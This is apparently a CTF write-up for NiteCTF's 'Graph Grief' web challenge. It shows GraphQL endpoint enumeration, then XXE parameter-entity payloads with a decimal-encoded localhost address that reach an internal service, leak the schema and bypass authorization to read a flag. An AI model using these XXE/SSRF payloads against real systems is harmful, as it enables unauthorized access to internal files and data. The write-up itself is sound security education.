<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Graph Grief • syndro</title>

  <script>
    (function() {
      const saved = localStorage.getItem('theme');
      const prefersLight = window.matchMedia('(prefers-color-scheme: light)').matches;
      if (saved === 'light' || (!saved && prefersLight)) document.documentElement.classList.add('light');
      else document.documentElement.classList.remove('light');
    })();
  </script>

  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700;900&family=Roboto+Mono:wght@300;400;700&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="../../style.css">

  <style>
    :root { --accent: #58a6ff; --green: #3fb950; --purple: #8b5cf6; --pink: #f472b6; }
    .light { --accent: #1f6feb; --green: #238636; }

    body {
      background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
      color: #e6edf3;
      font-family: 'Roboto Mono', monospace;
      min-height: 100vh;
      padding: 40px 20px;
      line-height: 1.8;
      transition: background 0.5s, color 0.5s;
    }
    .light body { background: #f6f8fa; color: #0d1117; }

    .container { max-width: 1100px; margin: 0 auto; }

    h1 {
      font-family: 'Orbitron', sans-serif;
      font-size: 4.8rem;
      text-align: center;
      background: linear-gradient(90deg, var(--accent), var(--purple), var(--pink));
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      margin: 20px 0 10px;
      text-shadow: 0 0 30px rgba(88,166,255,0.3);
    }
    .light h1 { background: linear-gradient(90deg, #1f6feb, #7c3aed, #ec4899); -webkit-background-clip: text; }

    .meta { text-align: center; opacity: 0.85; font-size: 1.2rem; margin-bottom: 60px; }
    .meta span { color: var(--accent); font-weight: bold; }

    h2 { color: var(--accent); margin: 50px 0 20px; font-family: 'Orbitron', sans-serif; font-size: 2.2rem; }

    p { margin: 20px 0; }

    pre {
      background: #161b22 !important;
      color: #f0f6fc !important;
      padding: 20px;
      border-radius: 14px;
      overflow-x: auto;
      border: 1px solid #30363d;
      font-size: 1.05rem;
      margin: 25px 0;
      white-space: pre-wrap;
    }
    .light pre {
      background: #f6f8fa !important;
      color: #24292f !important;
      border: 1px solid #d0d7de !important;
    }

    code {
      background: rgba(88,166,255,0.1);
      padding: 4px 10px;
      border-radius: 8px;
      color: var(--green);
    }
    .light code { background: rgba(30,110,254,0.15); }

    .container img {
      display: block;
      max-width: 100%;
      border-radius: 16px;
      margin: 30px auto;
      box-shadow: 0 20px 60px rgba(0,0,0,0.6);
      border: 2px solid rgba(88,166,255,0.3);
      cursor: zoom-in !important;
      transition: all 0.4s ease;
      user-select: none;
    }
    .light .container img { box-shadow: 0 15px 40px rgba(0,0,0,0.15); }
    .container img:hover {
      transform: scale(1.03);
      box-shadow: 0 25px 80px rgba(88,166,255,0.6);
    }

    .flag {
      background: rgba(0,255,0,0.1);
      padding: 30px;
      border-radius: 16px;
      font-size: 1.8rem;
      text-align: center;
      margin: 60px 0;
      color: var(--green);
      font-weight: bold;
      border: 3px dashed var(--green);
      font-family: 'Roboto Mono', monospace;
      letter-spacing: 1px;
    }
    .light .flag { background: rgba(35,134,54,0.08); border-color: #238636; }

    .back {
      position: fixed;
      top: 30px;
      left: 30px;
      background: var(--accent);
      color: #000;
      padding: 16px 42px;
      border-radius: 50px;
      font-weight: bold;
      text-decoration: none;
      box-shadow: 0 12px 40px rgba(88,166,255,0.6);
      transition: all 0.4s ease;
      z-index: 9999;
      font-size: 1.1rem;
    }
    .back:hover { transform: translateY(-8px) scale(1.05); box-shadow: 0 20px 60px rgba(88,166,255,0.8); }
    .light .back { color: white; }

    .theme-toggle {
      position: fixed;
      top: 40px;
      right: 40px;
      width: 60px;
      height: 60px;
      background: var(--surface);
      border: 2px solid var(--accent);
      border-radius: 50%;
      color: var(--accent-light);
      font-size: 1.8rem;
      cursor: pointer;
      z-index: 100;
      transition: all 0.4s;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .theme-toggle:hover { background: var(--accent); color: #000; }
    .theme-toggle .moon { display: block; }
    .theme-toggle .sun { display: none; }
    .light .theme-toggle .moon { display: none; }
    .light .theme-toggle .sun { display: block; }

    #imageModal {
      display: none;
      position: fixed;
      z-index: 10000;
      left: 0; top: 0;
      width: 100%; height: 100%;
      background: rgba(0,0,0,0.97);
      backdrop-filter: blur(16px);
      align-items: center;
      justify-content: center;
      cursor: zoom-out;
      padding: 20px;
    }
    #imageModal.active {
      display: flex !important;
    }

    #imageModal img {
      max-width: 94%;
      max-height: 94vh;
      border-radius: 20px;
      border: 3px solid var(--accent);
      box-shadow: 0 0 120px rgba(88,166,255,0.8);
      animation: zoomIn 0.3s ease-out;
    }

    @keyframes zoomIn {
      from { transform: scale(0.8); opacity: 0; }
      to { transform: scale(1); opacity: 1; }
    }

    .close-modal {
      position: absolute;
      top: 30px; right: 40px;
      font-size: 4.5rem;
      width: 80px; height: 80px;
      background: rgba(255,255,255,0.15);
      color: white;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      cursor: pointer;
      transition: 0.3s;
    }
    .close-modal:hover {
      background: rgba(255,255,255,0.3);
      transform: scale(1.2);
    }

    @media (max-width: 768px) {
      h1 { font-size: 3.5rem; }
      .back { position: static; display: block; margin: 30px auto; width: fit-content; }
      .close-modal { top: 15px; right: 15px; font-size: 3rem; width: 60px; height: 60px; }
    }
  </style>
</head>
<body>
  <a href="https://syndro-1.github.io/page/CTF/Nite2025/Nite2025.html" class="back">Back</a>

  <button class="theme-toggle" id="themeToggle" aria-label="Toggle theme">
    <span class="sun">☀</span>
    <span class="moon">☾</span>
  </button>

  <div class="container">
    <h1>Graph Grief</h1>
    <div class="meta">NiteCTF • <span>Web</span> • syndro • 6 solves</div>
    <h2>0. Description</h2>
    <img src="Pic/0.png" alt="Description">
      
    <h2>1. Initial Access and Observations</h2>
    <p>Upon accessing the target, we are presented with AetherCorp's landing page showcasing their "Hyper-Graph Technology" API. The page prominently features GraphQL syntax in its demo code blocks and marketing copy, directly comparing their solution to traditional REST APIs.</p>

    <img src="Pic/1.png" alt="AetherCorp landing page with GraphQL demos">

    <p>Key observation: The page explicitly states "Traditional REST APIs are linear," highlighting the limitation of requiring multiple sequential requests to fetch related data.</p>

    <img src="Pic/2.png" alt="REST limitations highlighted on the landing page">

    <p><strong>The REST vs GraphQL Difference</strong><br>
    With traditional REST APIs, accessing nested resources requires chained requests:</p>
    <pre>GET /books/1                # First, get the book
GET /authors/1              # Then, get the author separately</pre>

    <p>GraphQL solves this efficiently with a single query:</p>
    <pre>query {
  book(id: "1") {
    title
    author {
      firstName
      lastName
    }
  }
}</pre>

    <p>Returning to the challenge: The name "Graph Grief," combined with the visible API and GraphQL-like sample queries on the frontend, strongly suggests we are dealing with a GraphQL endpoint.</p>

    <h2>2. Discovering the GraphQL Endpoint</h2>
    <p>We begin enumerating common GraphQL paths:</p>
    <pre>/v1/explorer
/v1/graphiql
/graph
/graphql
/graphql/console
/graphql.php
/graphiql
/graphiql.php</pre>

    <p>We successfully locate the functional endpoint at <code>/graphql</code>. This marks the beginning of the real challenge.</p>

    <img src="Pic/3.png" alt="GraphQL endpoint discovered at /graphql">

    <p>I opted to use ZAP for interacting with the endpoint, manually modifying the request body - I find this faster and more flexible. The same can be achieved with curl (remember to pipe output through <code>jq</code> for pretty-printing).</p>

    <img src="Pic/4.png" alt="Interacting with GraphQL via ZAP">

    <h2>3. Introspection Attempt</h2>
    <p>With direct access to the GraphQL interface, the first step is to reveal the full schema via introspection.</p>

    <img src="Pic/5.png" alt="Attempting standard introspection">

    <p>Introspection is disabled - queries for <code>__schema</code> or <code>__type</code> fail. However, the error message is quite revealing:</p>
    <pre>"Field \"__schema\" of type \"__Schema!\" must have a selection of subfields. Did you mean \"__schema { ... }\"?"</pre>

    <p>There are two viable approaches from here:</p>
    <ol>
      <li>Blind schema guessing using a GraphQL wordlist (highly recommended for efficiency and sanity).<br>
      Reference: <a href="https://github.com/Escape-Technologies/graphql-wordlist" target="_blank">https://github.com/Escape-Technologies/graphql-wordlist</a></li>
      <li>Leveraging an alternative vulnerability path (the one I followed).</li>
    </ol>

    <h2>4. Pivoting to XML Content Type</h2>
    <p>The landing page contains subtle but critical hints:</p>

    <img src="Pic/7.png" alt="Developer notes on the landing page">

    <pre>Full support for application/json and application/xml
Detailed error messages that definitely don't leak stack traces
Developer Note: Legacy XML importer may trigger internal file utilities.</pre>

    <p>We switch to XML by setting the <code>Content-Type: application/xml</code> header and test basic entity expansion:</p>
    <pre>&lt;?xml version="1.0" ?&gt;
&lt;!DOCTYPE replace [&lt;!ENTITY example "Doe"&gt; ]&gt;
&lt;userInfo&gt;
  &lt;firstName&gt;John&lt;/firstName&gt;
  &lt;lastName&gt;&example;&lt;/lastName&gt;
&lt;/userInfo&gt;</pre>

    <p>The entity is reflected successfully - XML processing is active and vulnerable to entity injection.</p>

    <img src="Pic/8.png" alt="Successful basic XXE entity reflection">

    <h2>5. Exploring XXE Capabilities</h2>
    <p>Attempting to read local files directly proves unsuccessful - general entities (<code>file://</code>) are blocked.</p>

    <img src="Pic/9.png" alt="General entities blocked">

    <p>The hints "Legacy XML" and the era around 1999 point toward SOAP (Simple Object Access Protocol), which was dominant during that time. We craft a SOAP-style payload to probe internal services.</p>

    <img src="Pic/10.png" alt="Initial SOAP payload attempt">

    <p>To bypass potential localhost filters, we use the decimal representation of 127.0.0.1: <code>2130706433</code>. Testing common ports (8080, 5432, 3000, 8000, 4200), we get a response on port 8000.</p>

    <img src="Pic/12.png" alt="Connection established to internal service on port 8000">

    <p>The error is actually positive - it indicates a successful connection, but the response contains HTML (likely index.html), which breaks XML parsing.</p>

    <h2>6. Leaking the GraphQL Schema</h2>
    <p>Common schema filenames are typically <code>schema.graphql</code> or <code>graphql.schema</code>. Direct attempts fail, </p>

        <img src="Pic/13.png" alt="Path enumeration">
    
      So we enumerate deeper paths, and then I remember back in the Developer note section:
      <code>Developer Note: Legacy  Importer may trigger "INTERNAL FILE" utilities.</code> </p>
    
      <img src="Pic/Dev.png" alt="Develoepr note">
    
      <p>So discover <code>/internal/file</code>.</p>
      <p>Now we enumerate that with the schema file.</p>

    <p>Final payload:</p>
    <pre>&lt;soap:Body&gt;
&lt;!ENTITY % dtd SYSTEM "http://2130706433:8000/internal/file?name=schema.graphql"&gt;
%dtd;
&lt;/soap:Body&gt;</pre>

    <img src="Pic/14.png" alt="Schema successfully leaked">

    <p>The leaked schema:</p>
    <pre>interface Node {
  id: ID!
}

type Product implements Node {
  id: ID!
  name: String
  specs: String
}

type User implements Node {
  id: ID!
  username: String!
  fullName: String
  role: String
}

type Profile implements Node {
  id: ID!
  userId: ID!
  bio: String
  avatarUrl: String
}

type Order implements Node {
  id: ID!
  userId: ID!
  productId: ID!
  status: String
  createdAt: String
}

type AuditLog implements Node {
  id: ID!
  action: String!
  actorId: ID!
  targetNodeId: ID!
  timestamp: String!
  details: String
}

type secret implements Node {
  id: ID!
  hint: String
  flag: String
  level: String
}

type Query {
  about: String
  products: [Product]
  users: [User]
  profiles: [Profile]
  orders: [Order]
  auditLogs: [AuditLog]
  node(id: ID!): Node
}</pre>

    <h2>7. Accessing the Secret Node</h2>
    <p>With the full schema in hand, we spot the <code>secret</code> type implementing <code>Node</code> and containing a <code>flag</code> field.</p>

    <p><strong>Important:</strong> Interface implementations (like <code>secret</code>) are accessed via the <code>node(id: "ID") { ... on secret { ... } }</code> pattern, not as direct queries.</p>

    <p>We need a valid ID for the secret node. Using the exposed root queries, we dump data - most is noise (users, products, etc.), but <code>auditLogs</code> proves valuable.</p>

    <p>Payload:</p>
    <pre>{
  "query" : "query {auditLogs {id action actorId targetNodeId timestamp details}}"
}</pre>

    <img src="Pic/15.png" alt="Audit logs revealing secret node reference">
    <p>The leaked auditLogs:</p>
    <pre>
      {
  "data" : {
    "auditLogs" : [ {
      "id" : "QXVkaXRMb2c6bG9nLTE=",
      "action" : "LOGIN",
      "actorId" : "user-1",
      "targetNodeId" : "user-1",
      "timestamp" : "2024-01-15T10:00:00Z",
      "details" : "User login from 192.168.1.100"
    }, {
      "id" : "QXVkaXRMb2c6bG9nLTI=",
      "action" : "VIEW_PRODUCT",
      "actorId" : "user-2",
      "targetNodeId" : "user-5",
      "timestamp" : "2024-01-15T10:15:00Z",
      "details" : "Viewed product details"
    }, {
      "id" : "QXVkaXRMb2c6bG9nLTM=",
      "action" : "CREATE_ORDER",
      "actorId" : "user-3",
      "targetNodeId" : "order-1",
      "timestamp" : "2024-01-15T10:30:00Z",
      "details" : "New order created"
    }, {
      "id" : "QXVkaXRMb2c6bG9nLTQ=",
      "action" : "UPDATE_PROFILE",
      "actorId" : "user-5",
      "targetNodeId" : "profile-user-5",
      "timestamp" : "2024-01-15T11:00:00Z",
      "details" : "Profile bio updated"
    }, {
      "id" : "QXVkaXRMb2c6bG9nLTU=",
      "action" : "LOGIN",
      "actorId" : "user-7",
      "targetNodeId" : "user-7",
      "timestamp" : "2024-01-15T11:20:00Z",
      "details" : "User login from 192.168.1.101"
    }, {
      "id" : "QXVkaXRMb2c6bG9nLTY=",
      "action" : "VIEW_PRODUCT",
      "actorId" : "user-10",
      "targetNodeId" : "user-12",
      "timestamp" : "2024-01-15T11:45:00Z",
      "details" : "Viewed product details"
    }, {
      "id" : "QXVkaXRMb2c6bG9nLTc=",
      "action" : "ACCESS_DENIED",
      "actorId" : "user-8",
      "targetNodeId" : "user-20",
      "timestamp" : "2024-01-15T12:00:00Z",
      "details" : "Insufficient permissions"
    }, {
      "id" : "QXVkaXRMb2c6bG9nLTg=",
      "action" : "DATA_EXPORT",
      "actorId" : "user-1",
      "targetNodeId" : "user-5",
      "timestamp" : "2024-01-15T12:30:00Z",
      "details" : "User data exported"
    }, {
      "id" : "QXVkaXRMb2c6bG9nLTk=",
      "action" : "SUSPICIOUS_ACCESS",
      "actorId" : "user-9",
      "targetNodeId" : "admin-config-1",
      "timestamp" : "2024-01-15T13:00:00Z",
      "details" : "Attempted access to restricted resource"
    }, {
      "id" : "QXVkaXRMb2c6bG9nLTEw",
      "action" : "VIEW_PRODUCT",
      "actorId" : "user-15",
      "targetNodeId" : "user-30",
      "timestamp" : "2024-01-15T13:30:00Z",
      "details" : "Viewed product details"
    }, {
      "id" : "QXVkaXRMb2c6bG9nLTEx",
      "action" : "LOGIN",
      "actorId" : "user-18",
      "targetNodeId" : "user-18",
      "timestamp" : "2024-01-15T14:00:00Z",
      "details" : "User login from 192.168.1.102"
    }, {
      "id" : "QXVkaXRMb2c6bG9nLTEy",
      "action" : "API_QUERY",
      "actorId" : "user-12",
      "targetNodeId" : "admin-config-1",
      "timestamp" : "2024-01-15T14:30:00Z",
      "details" : "GraphQL query executed on restricted node"
    }, {
      "id" : "QXVkaXRMb2c6bG9nLTEz",
      "action" : "VIEW_PRODUCT",
      "actorId" : "user-20",
      "targetNodeId" : "user-55",
      "timestamp" : "2024-01-15T15:00:00Z",
      "details" : "Viewed product details"
    }, {
      "id" : "QXVkaXRMb2c6bG9nLTE0",
      "action" : "LOGOUT",
      "actorId" : "user-5",
      "targetNodeId" : "user-5",
      "timestamp" : "2024-01-15T15:30:00Z",
      "details" : "User logged out"
    }, {
      "id" : "QXVkaXRMb2c6bG9nLTE1",
      "action" : "SYSTEM_ALERT",
      "actorId" : "system",
      "targetNodeId" : "secret:flag",
      "timestamp" : "2024-01-15T16:00:00Z",
      "details" : "Attempted unauthorized access to system resource"
    } ]
  }
}
    </pre>

    <p>The logs reference <code>secret:flag</code>, and all IDs (e.g., <code>QXVkaXRMb2c6bG9nLTE1</code>) are Base64-encoded.</p>

    <p>Testing:</p>
    <ul>
      <li><code>secret:flag</code> → returns null</li>
      <li><code>c2VjcmV0OmZsYWc=</code> (Base64 of "secret:flag") → returns the object</li>
    </ul>

    <img src="Pic/17.png" alt="Direct query with raw ID fails">

    <img src="Pic/18.png" alt="Base64-encoded ID succeeds, but flag is hidden">

    <p>The <code>flag</code> field is redacted - authorization required (likely admin-only).</p>

    <img src="Pic/19.png" alt="Re-examining audit logs for clues">

    <h2>8. Authorization Bypass via Internal Endpoint</h2>
    <p>Since we already reach an internal service on port 8000, and it appears to host an unrestricted GraphQL instance, we proxy our query through the XXE vector:</p>

    <p>Final payload:</p>
    <pre>&lt;soap:Body&gt;
&lt;!ENTITY % dtd SYSTEM "http://2130706433:8000/internal/graphql?query=query{node(id:%22c2VjcmV0OmZsYWc=%22){__typename ...on secret{id hint level flag}}}"&gt;
%dtd;
&lt;/soap:Body&gt;</pre>

    <p>And there it is - the flag, unrestricted.</p>

    <img src="Pic/21.png" alt="Flag retrieved via internal GraphQL endpoint">

    <div class="flag">
      nite{REDACTED}
    </div>

    <p>god, i hate this challenge so much.</p>
  </div>

  <!-- Image Zoom Modal -->
  <div id="imageModal">
    <div class="close-modal">×</div>
    <img id="modalImage" src="" alt="Zoomed image">
  </div>

<script type="text/javascript">
var sc_project=13192699;
var sc_invisible=1;
var sc_security="f34343e1";
var scJsHost = "https://";
document.write("<sc"+"ript type='text/javascript' src='" +
scJsHost+
"statcounter.com/counter/counter.js'></"+"script>");
</script>
<noscript>
  <div class="statcounter">
    <img class="statcounter"
         src="https://c.statcounter.com/13192699/0/f34343e1/1/"
         alt="statcounter">
  </div>
</noscript>
  
  <script>
    // Theme toggle
    document.getElementById('themeToggle')?.addEventListener('click', () => {
      document.documentElement.classList.toggle('light');
      localStorage.theme = document.documentElement.classList.contains('light') ? 'light' : 'dark';
    });

    // Image zoom modal
    const modal = document.getElementById('imageModal');
    const modalImg = document.getElementById('modalImage');
    const closeModalBtn = document.querySelector('#imageModal .close-modal');

    // Open modal on image click
    document.querySelectorAll('.container img').forEach(img => {
      img.style.cursor = 'zoom-in';
      img.onclick = function(e) {
        e.stopPropagation();
        modalImg.src = this.src;
        modal.classList.add('active');
        document.body.style.overflow = 'hidden';
      };
    });

    // Close modal: X button
    closeModalBtn.onclick = () => {
      modal.classList.remove('active');
      document.body.style.overflow = '';
    };

    // Close modal: background click
    modal.onclick = (e) => {
      if (e.target === modal) {
        modal.classList.remove('active');
        document.body.style.overflow = '';
      }
    };

    // Close modal: Escape key
    document.addEventListener('keydown', (e) => {
      if (e.key === 'Escape' && modal.classList.contains('active')) {
        modal.classList.remove('active');
        document.body.style.overflow = '';
      }
    });
  </script>
</body>
</html>
